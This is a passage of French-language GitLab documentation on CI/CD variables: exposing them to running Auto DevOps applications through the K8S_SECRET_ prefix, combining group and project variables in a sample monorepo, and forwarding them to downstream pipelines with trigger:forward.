- Vous pouvez configurer [Auto DevOps](../../topics/autodevops/_index.md) pour transmettre des variables CI/CD à une application en cours d'exécution. Pour rendre une variable CI/CD disponible en tant que variable d'environnement dans le conteneur de l'application en cours d'exécution, [préfixez la clé de la variable](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables) avec `K8S_SECRET_`.

- La vidéo [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck) est une présentation du projet d'exemple fonctionnel [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo). Elle explique comment plusieurs niveaux de variables CI/CD de groupe peuvent être combinés avec des variables de projet à portée d'environnement pour une configuration complexe des builds ou des déploiements d'applications.

  L'exemple peut être copié dans votre propre groupe ou instance à des fins de test. Des informations supplémentaires sur les autres patterns GitLab CI illustrés sont disponibles sur la page du projet.

- Vous pouvez [transmettre des variables CI/CD à des pipelines downstream](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline). Utilisez le [mot-clé `trigger:forward`](../yaml/_index.md#triggerforward) pour spécifier le type de variables à transmettre au pipeline downstream.
